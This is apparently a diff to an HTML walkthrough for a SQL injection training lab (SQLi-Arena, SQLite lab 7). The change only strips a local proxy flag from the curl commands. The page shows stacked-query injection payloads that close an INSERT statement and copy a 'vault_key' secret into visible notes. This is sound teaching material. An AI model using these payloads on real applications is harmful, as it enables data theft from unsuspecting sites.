@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Insertion</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=test"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=test"<br>
         <span class="prompt">SQL: </span>INSERT INTO notes (title, body) VALUES ('test', 'User note')<br><br>
         <span class="prompt">Response: </span><strong>Note added successfully!</strong><br><br>
         <span class="prompt">Existing Notes:</span><br>
@@ -37,7 +37,7 @@
     <div class="terminal-body">
         <span class="prompt">// Need to close BOTH title and body values:</span><br>
         <span class="prompt">// INSERT INTO notes (title, body) VALUES ('[input]', 'User note')</span><br><br>
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); SELECT 1; --"<br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); SELECT 1; --"<br>
         <span class="prompt">SQL: </span>INSERT INTO notes (title, body) VALUES ('x', 'y'); SELECT 1; --', 'User note')<br><br>
         <span class="prompt">Response: </span><strong>Note added successfully!</strong> (both INSERT and SELECT executed)
     </div>
@@ -56,7 +56,7 @@
         <span class="terminal-title">Step 3. Exfiltrate via INSERT SELECT</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); INSERT INTO notes (title, body) SELECT 'LEAKED', vault_key FROM vault; --"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); INSERT INTO notes (title, body) SELECT 'LEAKED', vault_key FROM vault; --"<br><br>
         <span class="prompt">Response: </span><strong>Note added successfully!</strong><br><br>
         <span class="prompt">Existing Notes (updated):</span><br>
         ID | Title | Body<br>
@@ -85,7 +85,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); INSERT INTO notes (title, body) SELECT 'LEAKED', vault_key FROM vault; --"
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/sqlite/lab7" \<br> --data-urlencode "title=x', 'y'); INSERT INTO notes (title, body) SELECT 'LEAKED', vault_key FROM vault; --"
     </div>
 </div>
 
